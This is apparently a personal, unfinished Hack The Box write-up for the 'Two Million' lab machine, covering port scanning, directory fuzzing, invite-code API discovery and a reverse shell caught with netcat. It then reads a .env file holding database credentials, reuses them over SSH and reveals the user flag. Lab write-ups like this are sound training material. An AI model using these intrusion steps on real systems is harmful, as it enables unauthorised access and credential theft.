---
title: "Two Million"
kind: writeup
tags:
  - hack-the-box-labs
  - status/in-progress
  - writeup
  - api
  - linux
status: "In progress"
difficulty: "Easy"
date: 2026-06-07
url: "https://app.hackthebox.com/machines/TwoMillion?sort_by=created_at&sort_type=desc"
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: c6d759b9275182ae9190817ae668d26c
---

# Two Million

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Nmap Scan

```bash
┌──(exp10i73r㉿kali)-[~/nmap]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan 10.129.103.230
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 20:45 +0530
Warning: 10.129.103.230 giving up on port because retransmission cap hit (6).
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 41.36% done; ETC: 20:46 (0:00:57 remaining)
Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 20:47 (0:00:00 remaining)
Nmap scan report for 10.129.103.230
Host is up (0.35s latency).
Not shown: 65365 closed tcp ports (reset), 168 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.28 seconds

```

## Fuzzing Directories

```bash
┌──(exp10i73r㉿kali)-[~]
└─$ ffuf -u "http://2million.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r -fl 46

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 46
________________________________________________

api                     [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 811ms]
assets                  [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 428ms]
controllers             [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 322ms]
css                     [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 1127ms]
fonts                   [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 1126ms]
home                    [Status: 200, Size: 64952, Words: 28274, Lines: 1243, Duration: 340ms]
images                  [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 329ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 411ms]
js                      [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 335ms]
login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 713ms]
logout                  [Status: 200, Size: 64952, Words: 28274, Lines: 1243, Duration: 346ms]
register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 371ms]
views                   [Status: 200, Size: 64952, Words: 28274, Lines: 1243, Duration: 544ms]
:: Progress: [20481/20481] :: Job [1/1] :: 45 req/sec :: Duration: [0:09:41] :: Errors: 30 ::

```

## Finding the invite code

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_20-51-02.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_20-52-40.png]]

### inviteapi.min.js

```javascript
eval(function (p, a, c, k, e, d) {    e = function (c) {        return c.toString(36)    };    if (!''.replace(/^/, String)) {        while (c--) {            d[c.toString(a)] = k[c] || c.toString(a)        }        k = [function (e) {            return d[e]        }];        e = function () {            return '\\w+'        };        c = 1    };    while (c--) {        if (k[c]) {            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])        }    }    return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
```

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-01-35.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-02-27.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-03-53.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-04-50.png]]

## Using the invite code

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-07-15.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-07-58.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-08-55.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/Screenshot_2026-06-07_at_21-09-25.png]]

## Finding APIs

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 1.png]]

## Exploiting Mass Assignment

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 2.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 3.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 4.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 5.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 6.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 7.png]]

## Exploiting Command Injection

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 8.png]]

![[attachments/Hack The Box Labs/Hack The Box/Two Million/image 9.png]]

## User Flag

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.129.229.66] 40104
bash: cannot set terminal process group (1095): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@2million:~/html$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                         
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm

```

```bash
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

ww-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

```bash
┌──(kali㉿kali)-[~]
└─$ ssh admin@10.129.229.66
The authenticity of host '10.129.229.66 (10.129.229.66)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.129.229.66' (ED25519) to the list of known hosts.
admin@10.129.229.66's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun  8 06:03:15 AM UTC 2026

  System load:           0.0244140625
  Usage of /:            83.0% of 4.82GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.66
  IPv6 address for eth0: dead:beef::250:56ff:fe95:f9a2

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt 
55d51ecd70e572952c42a275a3f74904

```

## Root Flag

```bash

```
